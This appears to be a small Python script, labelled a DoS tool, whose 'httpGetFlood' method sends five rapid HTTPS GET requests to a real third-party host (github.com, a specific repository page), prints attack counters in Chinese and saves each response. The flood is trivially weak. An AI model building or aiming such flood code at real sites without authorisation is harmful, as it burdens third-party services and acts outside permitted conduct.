import http.client
import urllib
import time

class Dos(object):
    def __init__(self):
        pass

    def httpGetFlood(self,sleepTime,servAddr,url):
        for i in range(5):
            print('第',i+1,'次攻击')
            time.sleep(sleepTime)
            try:
                #conn = http.client.HTTPConnection(servAddr)
                #conn.request('GET',url)
                #r1 = conn.getresponse()
                #print(r1.status,r1.reason)
                #conn.close()

                conns=http.client.HTTPSConnection(servAddr)
                conns.request("GET", url)
                r1 = conns.getresponse()
                print(r1.status, r1.reason)

                fp = open("test_file", "wb")
                fp.write(r1.read())

                conns.close()
            except IOError as e:
                print("except:",e)
            finally:
                pass
        print("httpGetDoS END")



if __name__ == '__main__':
    servAddr = "github.com"
    url = "/bl201809/bllist/blob/master/index.html"
    sleepTime = 0.01
    hack = Dos()
    hack.httpGetFlood(sleepTime,servAddr,url)
